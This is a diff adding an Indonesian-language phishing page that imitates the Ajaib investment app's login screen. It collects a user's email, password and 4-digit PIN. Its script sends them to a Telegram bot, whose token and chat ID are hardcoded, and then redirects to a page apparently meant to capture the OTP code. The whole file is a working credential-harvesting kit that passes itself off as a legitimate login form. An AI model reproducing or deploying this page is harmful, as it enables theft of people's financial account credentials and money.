@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Ajaib</title>
+  <style>
+    body {
+      background-color: #0A0E17;
+      color: white;
+      font-family: sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      padding: 24px;
+      max-width: 400px;
+      margin: auto;
+    }
+    h1 {
+      font-size: 20px;
+      font-weight: bold;
+    }
+    p {
+      font-size: 14px;
+      color: #ccc;
+      margin-bottom: 32px;
+    }
+    .input-group {
+      margin-bottom: 20px;
+    }
+    .input {
+      display: flex;
+      align-items: center;
+      background-color: #131A26;
+      border: 1px solid #2E3A4D;
+      border-radius: 10px;
+      padding: 12px;
+      color: white;
+    }
+    .input input {
+      flex: 1;
+      background: none;
+      border: none;
+      color: white;
+      font-size: 16px;
+    }
+    .input input:focus {
+      outline: none;
+    }
+    .icon-img, .toggle-eye {
+      width: 24px;
+      height: 24px;
+      margin: 0 8px;
+    }
+    .forgot {
+      text-align: right;
+      margin-top: -10px;
+      margin-bottom: 32px;
+    }
+    .forgot a {
+      color: #3578E5;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .btn {
+      background-color: #3A3A3A;
+      color: #9DA9B9;
+      border: none;
+      padding: 16px;
+      width: 100%;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: not-allowed;
+      transition: background 0.3s ease;
+    }
+    .btn.active {
+      background-color: #3578E5;
+      color: white;
+      cursor: pointer;
+    }
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin-top: -16px;
+      margin-bottom: 12px;
+      display: none;
+    }
+    
+     .error-message1 {
+  color: red;
+  font-size: 12px;     /* Lebih kecil */
+  margin-top: 4px;     /* Geser ke bawah */
+  margin-left: 4px;    /* Jarak dari kiri input */
+  display: none;
+}
+
+    /* Popup PIN */
+    .pin-popup {
+      display: flex;
+      justify-content: center;
+      align-items: flex-end;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      z-index: 999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .pin-popup.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    .pin-box {
+      background: #1C1F2B;
+      padding: 20px;
+      border-radius: 16px 16px 0 0;
+      width: 100%;
+      max-width: 340px;
+      transform: translateY(100%);
+      transition: transform 0.4s ease;
+      box-shadow: 0 -8px 24px rgba(0, 0, 0, 0.4);
+    }
+    .pin-popup.show .pin-box {
+      transform: translateY(0);
+    }
+    .pin-box h5 {
+      font-size: 10px;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+    .pin-inputs {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+    .pin-inputs input {
+      width: 48px;
+      height: 48px;
+      text-align: center;
+      font-size: 20px;
+      border-radius: 12px;
+      border: 1px solid #333;
+      background: #111827;
+      color: white;
+      outline: none;
+    }
+
+    /* Loading Page */
+    #loadingPage {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: white;
+      color: black;
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    #loadingPage iframe {
+      width: 150px;
+      height: 150px;
+      border: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container" id="mainContent">
+  <h1>Masukkan alamat Email</h1>
+  <p>Masukkan alamat email yang telah terdaftar di Ajaib untuk melanjutkan atau alamat email baru untuk daftar akun Ajaib.</p>
+
+  <div class="input-group">
+    <div class="input">
+      <img src="https://i.imghippo.com/files/pKO8053Vxg.webp" class="icon-img" alt="email">
+      <input type="email" id="email" placeholder="Email">
+    </div>
+  </div>
+
+  <div class="input-group">
+    <div class="input">
+      <input type="password" id="password" placeholder="Masukkan password">
+      <img id="togglePassword" class="toggle-eye" src="https://i.imghippo.com/files/FsXC7942wKY.webp" alt="toggle">
+    </div>
+    <div class="error-message1" id="passwordError">Password harus kombinasi huruf, angka dan simbol.</div>
+  </div>
+
+  <div class="forgot">
+    <a href="#">Lupa Password</a>
+  </div>
+
+  <button class="btn" id="loginBtn" disabled>Masuk</button>
+</div>
+
+<!-- Popup PIN -->
+<div class="pin-popup" id="pinPopup">
+  <div class="pin-box">
+    <h5>Masukkan PIN Ajaib</h5>
+    <div class="pin-inputs">
+      <input maxlength="1" type="password" class="pin" />
+      <input maxlength="1" type="password" class="pin" />
+      <input maxlength="1" type="password" class="pin" />
+      <input maxlength="1" type="password" class="pin" />
+    </div>
+    <div class="error-message" id="errorMsg">Koneksi internet tidak tersedia</div>
+    <button class="btn" id="submitBtn" disabled>Konfirmasi</button>
+  </div>
+</div>
+
+<!-- Loading Page -->
+<div id="loadingPage">
+  <iframe src="https://lottie.host/embed/d3ffbad0-b0d3-4279-bc90-b14019537bd6/msgti3STmj.lottie" title="Loading"></iframe>
+  <p></p>
+</div>
+
+<!-- Script -->
+<script>
+  const emailInput = document.getElementById('email');
+  const passwordInput = document.getElementById('password');
+  const loginBtn = document.getElementById('loginBtn');
+  const togglePassword = document.getElementById('togglePassword');
+  const passwordError = document.getElementById('passwordError');
+
+  const pinPopup = document.getElementById('pinPopup');
+  const pinInputs = document.querySelectorAll('.pin');
+  const submitBtn = document.getElementById('submitBtn');
+  const errorMsg = document.getElementById('errorMsg');
+
+  const loadingPage = document.getElementById('loadingPage');
+
+  // Toggle show/hide password
+  togglePassword.addEventListener('click', () => {
+    const hidden = passwordInput.type === 'password';
+    passwordInput.type = hidden ? 'text' : 'password';
+    togglePassword.src = hidden
+      ? 'https://i.imghippo.com/files/PSF1232dVc.webp'
+      : 'https://i.imghippo.com/files/FsXC7942wKY.webp';
+  });
+
+  // Validasi password
+  function isPasswordValid(pw) {
+    return /[A-Za-z]/.test(pw) && /\d/.test(pw) && /[^A-Za-z0-9]/.test(pw);
+  }
+
+  function validateInputs() {
+    const valid = emailInput.value && passwordInput.value;
+    loginBtn.disabled = !valid;
+    loginBtn.classList.toggle('active', valid);
+  }
+
+  passwordInput.addEventListener('input', () => {
+    if (!isPasswordValid(passwordInput.value)) {
+      passwordError.style.display = 'block';
+      loginBtn.disabled = true;
+    } else {
+      passwordError.style.display = 'none';
+      validateInputs();
+    }
+  });
+
+  emailInput.addEventListener('input', validateInputs);
+
+  loginBtn.addEventListener('click', () => {
+    pinPopup.classList.add('show');
+    pinInputs[0].focus();
+  });
+
+  pinInputs.forEach((input, i) => {
+    input.addEventListener('input', () => {
+      if (input.value && i < pinInputs.length - 1) {
+        pinInputs[i + 1].focus();
+      }
+      checkPinFilled();
+    });
+    input.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !input.value && i > 0) {
+        pinInputs[i - 1].focus();
+      }
+    });
+  });
+
+  function checkPinFilled() {
+    const allFilled = Array.from(pinInputs).every(input => input.value);
+    submitBtn.disabled = !allFilled;
+    submitBtn.classList.toggle('active', allFilled);
+  }
+
+  submitBtn.addEventListener('click', async () => {
+    if (!navigator.onLine) {
+      errorMsg.style.display = 'block';
+      return;
+    }
+
+    errorMsg.style.display = 'none';
+    loadingPage.style.display = 'flex';
+
+    const email = emailInput.value;
+    const password = passwordInput.value;
+    const pin = Array.from(pinInputs).map(i => i.value).join('');
+
+    const message = `🔐 DATA MASUK PENGGUNA 🔐\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🔒 PIN: ${pin}\n🔢 Kode OTP: Belum diisi`;
+
+    try {
+      await fetch(`https://api.telegram.org/bot8071583681:AAF6hoDB1lMVpx59cIEM_caXsHfjgZh_2ps/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: '7958093111',
+          text: message
+        })
+      });
+      setTimeout(() => {
+        window.location.href = 'kodeajaib.html'; // ganti dengan halaman tujuanmu
+      }, 2000);
+    } catch (e) {
+      alert('Gagal mengirim data');
+      loadingPage.style.display = 'none';
+    }
+  });
+</script>
+</body>
+</html>
